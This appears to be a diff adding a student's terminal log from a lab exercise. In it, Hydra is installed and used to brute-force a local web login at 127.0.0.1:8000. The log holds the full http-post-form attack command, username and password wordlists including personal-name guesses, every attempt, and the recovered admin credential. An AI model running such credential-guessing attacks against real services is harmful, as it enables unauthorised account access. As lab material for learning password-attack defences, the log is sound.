@@ -1,0 +1,111 @@
+Last login: Tue Mar  3 00:42:25 on ttys000
+You have new mail.
+samijabery@Samis-MacBook-Pro Lab-12 % source venv/bin/activate
+(venv) samijabery@Samis-MacBook-Pro Lab-12 % curl -X POST -F "username=admin" -F "password=12345admin" http://127.0.0.1:8000/login
+"secret token"%                                                                 (venv) samijabery@Samis-MacBook-Pro Lab-12 % curl -X POST -F "username=admin" -F "password=wrong" http://127.0.0.1:8000/login
+"Invalid credentials"%                                                          (venv) samijabery@Samis-MacBook-Pro Lab-12 % brew install hydra
+✔︎ JSON API formula.jws.json                          Downloaded   31.9MB/ 31.9MB
+✔︎ JSON API cask.jws.json                             Downloaded   15.3MB/ 15.3MB
+==> Fetching downloads for: hydra
+✔︎ Bottle Manifest hydra (9.6)                        Downloaded   25.0KB/ 25.0KB
+✔︎ Bottle Manifest mariadb-connector-c (3.4.8_1)      Downloaded   17.8KB/ 17.8KB
+✔︎ Bottle mariadb-connector-c (3.4.8_1)               Downloaded  463.4KB/463.4KB
+✔︎ Bottle hydra (9.6)                                 Downloaded  605.6KB/605.6KB
+==> Installing hydra dependency: mariadb-connector-c
+==> Pouring mariadb-connector-c--3.4.8_1.arm64_tahoe.bottle.tar.gz
+🍺  /opt/homebrew/Cellar/mariadb-connector-c/3.4.8_1: 164 files, 1.6MB
+==> Pouring hydra--9.6.arm64_tahoe.bottle.tar.gz
+🍺  /opt/homebrew/Cellar/hydra/9.6: 17 files, 1.8MB
+==> Running `brew cleanup hydra`...
+Disable this behaviour by setting `HOMEBREW_NO_INSTALL_CLEANUP=1`.
+Hide these hints with `HOMEBREW_NO_ENV_HINTS=1` (see `man brew`).
+(venv) samijabery@Samis-MacBook-Pro Lab-12 % vim usernames.txt
+(venv) samijabery@Samis-MacBook-Pro Lab-12 % nano passwords.txt
+(venv) samijabery@Samis-MacBook-Pro Lab-12 % vim passwords.txt 
+(venv) samijabery@Samis-MacBook-Pro Lab-12 % hydra -f -V -L usernames.txt -P passwords.txt -s 8000 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-03 00:50:15
+[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:3/p:4), ~1 try per task
+[DATA] attacking http-post-form://127.0.0.1:8000/login:username=^USER^&password=^PASS^:F=Invalid
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "1234" - 1 of 12 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "admin" - 2 of 12 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "12345admin" - 3 of 12 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "password" - 4 of 12 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "1234" - 5 of 12 [child 4] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "admin" - 6 of 12 [child 5] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "12345admin" - 7 of 12 [child 6] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "password" - 8 of 12 [child 7] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "1234" - 9 of 12 [child 8] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "admin" - 10 of 12 [child 9] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "12345admin" - 11 of 12 [child 10] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "password" - 12 of 12 [child 11] (0/0)
+[8000][http-post-form] host: 127.0.0.1   login: admin   password: 12345admin
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-03 00:50:15
+(venv) samijabery@Samis-MacBook-Pro Lab-12 % vim smart_passwords.txt
+(venv) samijabery@Samis-MacBook-Pro Lab-12 % hydra -f -V -L usernames.txt -P smart_passwords.txt -s 8000 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-03 00:51:32
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 21 login tries (l:3/p:7), ~2 tries per task
+[DATA] attacking http-post-form://127.0.0.1:8000/login:username=^USER^&password=^PASS^:F=Invalid
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Sami2000" - 1 of 21 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Jaberi2000" - 2 of 21 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "SamiJaberi" - 3 of 21 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Sami123" - 4 of 21 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Jaberi123" - 5 of 21 [child 4] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Sami@2000" - 6 of 21 [child 5] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Jaberi!" - 7 of 21 [child 6] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "Sami2000" - 8 of 21 [child 7] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "Jaberi2000" - 9 of 21 [child 8] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "SamiJaberi" - 10 of 21 [child 9] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "Sami123" - 11 of 21 [child 10] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "Jaberi123" - 12 of 21 [child 11] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "Sami@2000" - 13 of 21 [child 12] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "Jaberi!" - 14 of 21 [child 13] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "Sami2000" - 15 of 21 [child 14] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "Jaberi2000" - 16 of 21 [child 15] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "SamiJaberi" - 17 of 21 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "Sami123" - 18 of 21 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "Jaberi123" - 19 of 21 [child 5] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "Sami@2000" - 20 of 21 [child 6] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "Jaberi!" - 21 of 21 [child 10] (0/0)
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-03 00:51:33
+(venv) samijabery@Samis-MacBook-Pro Lab-12 % vim smart_passwords.txt
+(venv) samijabery@Samis-MacBook-Pro Lab-12 % hydra -f -V -L usernames.txt -P smart_passwords.txt -s 8000 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-03 00:53:04
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:3/p:8), ~2 tries per task
+[DATA] attacking http-post-form://127.0.0.1:8000/login:username=^USER^&password=^PASS^:F=Invalid
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Sami2000" - 1 of 24 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Jaberi2000" - 2 of 24 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "SamiJaberi" - 3 of 24 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Sami123" - 4 of 24 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Jaberi123" - 5 of 24 [child 4] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Sami@2000" - 6 of 24 [child 5] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "Jaberi!" - 7 of 24 [child 6] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "admin" - pass "12345admin" - 8 of 24 [child 7] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "Sami2000" - 9 of 24 [child 8] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "Jaberi2000" - 10 of 24 [child 9] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "SamiJaberi" - 11 of 24 [child 10] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "Sami123" - 12 of 24 [child 11] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "Jaberi123" - 13 of 24 [child 12] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "Sami@2000" - 14 of 24 [child 13] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "Jaberi!" - 15 of 24 [child 14] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "user" - pass "12345admin" - 16 of 24 [child 15] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "Sami2000" - 17 of 24 [child 13] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "Jaberi2000" - 18 of 24 [child 0] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "SamiJaberi" - 19 of 24 [child 1] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "Sami123" - 20 of 24 [child 2] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "Jaberi123" - 21 of 24 [child 3] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "Sami@2000" - 22 of 24 [child 4] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "Jaberi!" - 23 of 24 [child 5] (0/0)
+[ATTEMPT] target 127.0.0.1 - login "test" - pass "12345admin" - 24 of 24 [child 6] (0/0)
+[8000][http-post-form] host: 127.0.0.1   login: admin   password: 12345admin
+[STATUS] attack finished for 127.0.0.1 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-03 00:53:05
+(venv) samijabery@Samis-MacBook-Pro Lab-12 % 
